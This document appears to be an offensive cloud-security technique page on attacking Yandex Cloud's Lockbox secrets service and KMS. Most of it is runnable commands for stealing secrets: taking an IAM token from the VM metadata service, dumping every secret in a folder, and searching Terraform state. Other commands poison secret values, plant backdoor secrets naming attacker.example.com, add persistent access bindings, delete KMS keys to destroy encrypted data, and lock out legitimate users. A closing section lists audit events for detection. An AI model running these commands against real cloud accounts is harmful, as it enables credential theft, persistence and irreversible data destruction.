# Yandex Cloud - Lockbox & KMS Techniques

## Service Overview

**Lockbox** is Yandex Cloud's secrets management service. Secrets are versioned collections of key-value pairs (passwords, API keys, tokens, SSH keys). A critical design choice: the `lockbox.editor` role can create/delete secrets but **cannot read their contents** — only `lockbox.payloadViewer` grants read access. Secret management and payload retrieval use **separate API hosts**.

**KMS** (Key Management Service) manages symmetric and asymmetric encryption keys. Supports AES-128/192/256, GOST (Kuznyechik), and HSM-backed keys. Private keys for asymmetric operations never leave KMS. KMS keys protect Lockbox secrets, Compute disks, Object Storage buckets, and Kubernetes secrets.

**Key Concepts:**
- **Lockbox Secrets**: Versioned key-value pairs. States: `ACTIVE`, `INACTIVE`. Versions are immutable
- **KMS Symmetric Keys**: Versioned encryption keys with auto-rotation. Direct encryption limit: 32 KB (use envelope encryption for larger data)
- **KMS Asymmetric Keys**: Encryption key pairs (RSA-2048/3072/4096) and signature key pairs (RSA-PSS, ECDSA variants)
- **Envelope Encryption**: For data > 32 KB — generate DEK with KMS, encrypt data locally with DEK
- **HSM**: Hardware security module option (`AES-256 HSM`) — keys never leave the HSM as plaintext
- **Cross-Service**: KMS keys protect Lockbox secrets, Compute disks, S3 buckets, K8s secrets

---

## Enumeration

### Enumerate Lockbox Secrets

```bash
# List all secrets in a folder
yc lockbox secret list --folder-id <folder_id>

# Get secret metadata (ID, name, KMS key, status, current version, entry keys)
yc lockbox secret get <secret_name_or_id>

# List all versions of a secret
yc lockbox secret list-versions <secret_name_or_id>

# List access bindings (who can read/manage this secret)
yc lockbox secret list-access-bindings <secret_name_or_id>
```

### Enumerate KMS Keys

```bash
# List symmetric keys
yc kms symmetric-key list --folder-id <folder_id>

# Get key details (algorithm, rotation period, primary version)
yc kms symmetric-key get <key_name_or_id>

# List key versions
yc kms symmetric-key list-versions <key_name_or_id>

# List access bindings
yc kms symmetric-key list-access-bindings --id <key_id>

# List asymmetric encryption keys
yc kms asymmetric-encryption-key list --folder-id <folder_id>

# List asymmetric signature keys
yc kms asymmetric-signature-key list --folder-id <folder_id>
```

### API-Based Enumeration

```bash
# List Lockbox secrets
curl -s -H "Authorization: Bearer <IAM_TOKEN>" \
  "https://lockbox.api.cloud.yandex.net/lockbox/v1/secrets?folderId=<folder_id>"

# List KMS keys
curl -s -H "Authorization: Bearer <IAM_TOKEN>" \
  "https://kms.api.cloud.yandex.net/kms/v1/keys?folderId=<folder_id>"
```

---

## Credential Access

### Exfiltrate Lockbox Secrets

Requires `lockbox.payloadViewer` or `lockbox.admin`:

```bash
# Get the current version's payload
yc lockbox payload get <secret_name_or_id>

# Get a specific version's payload
yc lockbox payload get <secret_name_or_id> --version-id <version_id>

# Get a single key's value
yc lockbox payload get <secret_name_or_id> --key <key_name>
```

### Exfiltrate via API (from Compromised VM)

```bash
# Get IAM token from metadata service
IAM_TOKEN=$(curl -sf -H "Metadata-Flavor:Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token \
  | jq -r .access_token)

# Retrieve secret payload by ID
curl -s -H "Authorization: Bearer $IAM_TOKEN" \
  "https://payload.lockbox.api.cloud.yandex.net/lockbox/v1/secrets/<secret_id>/payload"

# Retrieve secret payload by name (no need to know the secret ID)
curl -s -H "Authorization: Bearer $IAM_TOKEN" \
  "https://payload.lockbox.api.cloud.yandex.net/lockbox/v1/secrets:getEx?folderAndName.folderId=<folder_id>&folderAndName.secretName=<secret_name>"
```

**Note**: The `getEx` endpoint allows lookup by folder ID + secret name — useful when you know the secret name but not its ID.

### Exfiltrate All Secrets in a Folder

```bash
# List all secrets, then retrieve each payload
for secret_id in $(yc lockbox secret list --folder-id <folder_id> --format json | jq -r '.[].id'); do
  echo "=== Secret: $secret_id ==="
  yc lockbox payload get --id "$secret_id" 2>/dev/null
done
```

### Decrypt Data with KMS Keys

With `kms.keys.decrypter` or `kms.keys.encrypterDecrypter`:

```bash
# Decrypt data
yc kms symmetric-crypto decrypt \
  --id <key_id> \
  --ciphertext-file <encrypted_file> \
  --plaintext-file <output_file>

# Decrypt with asymmetric private key
yc kms asymmetric-encryption-crypto decrypt \
  --id <key_pair_id> \
  --ciphertext-file <encrypted_file> \
  --plaintext-file <output_file>
```

### Steal Secrets from Terraform State

Terraform `yandex_lockbox_secret_version` resources store plaintext secret values in state:

```bash
# Search Terraform state for Lockbox secrets
grep -r "text_value\|secret_key\|password" terraform.tfstate
```

The `yandex_lockbox_secret_version_hashed` variant stores hashed values instead — but many deployments use the plaintext variant.

### Harvest Database Credentials from Connection Manager Secrets

Connection Manager auto-creates Lockbox secrets when managed database clusters are created. These contain database credentials:

```bash
# List secrets, look for connection manager auto-created secrets
yc lockbox secret list --folder-id <folder_id>
# Connection Manager secrets have names matching connection IDs
# They contain database usernames and passwords
```

---

## Privilege Escalation

### lockbox.editor — Secret Poisoning

`lockbox.editor` cannot read secrets but CAN create new versions. This enables poisoning attacks — replacing secret values with attacker-controlled data:

```bash
# Create a new version of a secret with attacker-controlled values
yc lockbox secret add-version <secret_name> \
  --payload '[{"key": "password", "text_value": "attacker-controlled-password"}]' \
  --base-version-id <current_version_id>
```

**Impact**: Applications consuming the secret will use the attacker's values. This can be used to:
- Inject attacker-controlled database credentials
- Replace API keys with attacker-controlled ones
- Modify connection strings to point to attacker infrastructure

### Folder/Cloud Role Inheritance

A single `lockbox.payloadViewer` at the cloud level grants read access to ALL secrets in ALL folders:

```bash
# Check for overprivileged assignments
yc resource-manager cloud list-access-bindings <cloud_id>
yc resource-manager folder list-access-bindings <folder_id>
# Look for lockbox.payloadViewer or lockbox.admin at high scope
```

### KMS Key Access via Role Inheritance

Similarly, `kms.keys.encrypterDecrypter` at the folder level grants encrypt/decrypt on ALL keys in that folder.

---

## Persistence

### Create Backdoor Lockbox Secret

Store attacker credentials or C2 configuration in a Lockbox secret for retrieval:

```bash
yc lockbox secret create \
  --name monitoring-config \
  --payload '[{"key": "endpoint", "text_value": "https://attacker.example.com"}, {"key": "token", "text_value": "backdoor-token"}]'
```

### Grant Persistent Secret Access

Add access binding for a compromised SA to maintain secret access:

```bash
yc lockbox secret add-access-binding --id <secret_id> \
  --service-account-id <compromised_sa_id> \
  --role lockbox.payloadViewer
```

### Create Backdoor KMS Key

Create a KMS key for encrypting exfiltrated data or maintaining access:

```bash
yc kms symmetric-key create \
  --name backup-key \
  --default-algorithm aes-256 \
  --rotation-period 8760h
```

---

## Impact / Destruction

### Delete KMS Key — Destroy All Encrypted Data

Deleting a KMS key permanently destroys all data encrypted with it after the 3-day grace period:

```bash
# Disable deletion protection first
yc kms symmetric-key update --name <key_name> --no-deletion-protection

# Delete the key (3-day grace period before versions are destroyed)
yc kms symmetric-key delete <key_name>
```

**Impact**: This destroys:
- Lockbox secrets encrypted with this key
- Compute disk data encrypted with this key
- S3 objects encrypted with this key
- K8s secrets encrypted with this key

### Deactivate KMS Key — Block Access

Deactivation is **eventually consistent** — takes up to 3 hours to fully propagate:

```bash
yc kms symmetric-key update --name <key_name> --status inactive
```

### Deactivate Lockbox Secrets

```bash
# Deactivate a secret (payload becomes inaccessible)
yc lockbox secret deactivate <secret_name>
```

### Schedule Version Destruction

```bash
# Schedule destruction of a specific secret version
yc lockbox secret schedule-version-destruction <secret_name> \
  --version-id <version_id> --pending-period 168h

# Schedule destruction of a KMS key version
yc kms symmetric-key schedule-version-destruction <key_name> \
  --version-id <version_id>
```

### Overwrite Access Bindings

`set-access-bindings` **replaces ALL** existing bindings — can be used to lock out legitimate users:

```bash
# Replace all bindings (locks out everyone else)
yc lockbox secret set-access-bindings --id <secret_id> \
  --access-binding role=lockbox.admin,service-account-id=<attacker_sa_id>
```

---

## Defense Evasion

### Impersonate Service Accounts

Use the `--impersonate-service-account-id` flag to act as a different SA:

```bash
yc lockbox payload get <secret_name> \
  --impersonate-service-account-id <sa_with_payloadViewer>
```

### Access Secrets from Serverless Functions

If a serverless function's SA has `lockbox.payloadViewer`, secrets are injected as environment variables — no explicit API calls needed in audit logs for the payload retrieval.

---

## Key IAM Roles

### Lockbox

| Role | What it Enables |
|---|---|
| `lockbox.auditor` | View secret metadata and access bindings |
| `lockbox.viewer` | View secret info and access permissions |
| `lockbox.editor` | Create/delete secrets, manage versions. **Cannot read contents** |
| `lockbox.payloadViewer` | **Read secret contents (payload)** — the critical exfiltration role |
| `lockbox.admin` | Full control: editor + payloadViewer + manage access bindings |

### KMS

| Role | What it Enables |
|---|---|
| `kms.auditor` | View key list and metadata |
| `kms.viewer` | View key info and quotas |
| `kms.keys.encrypter` | Encrypt data with symmetric keys |
| `kms.keys.decrypter` | Decrypt data with symmetric keys |
| `kms.keys.encrypterDecrypter` | Encrypt and decrypt with symmetric keys |
| `kms.keys.user` | View and use symmetric keys |
| `kms.editor` | Create/rotate/modify keys, encrypt/decrypt. Cannot delete keys |
| `kms.admin` | Full control: editor + delete keys + manage access bindings |
| `kms.asymmetricEncryptionKeys.publicKeyViewer` | Get asymmetric public encryption key |
| `kms.asymmetricEncryptionKeys.decrypter` | Decrypt with asymmetric private key |
| `kms.asymmetricSignatureKeys.signer` | Sign with asymmetric private key |

**Cross-service requirement**: To access KMS-encrypted Lockbox secrets, you need BOTH `lockbox.payloadViewer` (on the secret) AND `kms.keys.encrypterDecrypter` (on the KMS key).

---

## Detection and Logging

### Audit Trail Events — Lockbox

- `CreateSecret` / `DeleteSecret` — secret lifecycle
- `AddVersion` / `ScheduleVersionDestruction` — version management
- `Activate` / `Deactivate` — secret state changes
- `SetAccessBindings` / `UpdateAccessBindings` — permission changes
- **Data plane**: Payload retrieval events (secret reads)

### Audit Trail Events — KMS

- `CreateSymmetricKey` / `DeleteSymmetricKey` — key lifecycle
- `RotateSymmetricKey` / `SetPrimaryVersion` — version management
- `ScheduleSymmetricKeyVersionDestruction` — version destruction
- **Data plane**: `Encrypt`, `Decrypt`, `ReEncrypt`, `GenerateDataKey` operations

### Key Detection Opportunities

- Bulk payload retrieval (`GetPayload` events across many secrets) — secret exfiltration
- `AddVersion` without corresponding read — potential secret poisoning
- `Deactivate` on secrets or KMS keys — denial of service attempt
- `ScheduleVersionDestruction` — destruction activity
- `SetAccessBindings` changes — privilege manipulation
- Unusual `Decrypt` patterns — data exfiltration of encrypted data

---

## References

- Lockbox Documentation: `en/lockbox/`
- KMS Documentation: `en/kms/`
- Lockbox API — Payload: `en/lockbox/api-ref/Payload/`
- Lockbox API — Secrets: `en/lockbox/api-ref/Secret/`
- KMS API — Symmetric Crypto: `en/kms/api-ref/SymmetricCrypto/`
- Lockbox Security Roles: `en/lockbox/security/index.md`
- KMS Security Roles: `en/kms/security/index.md`
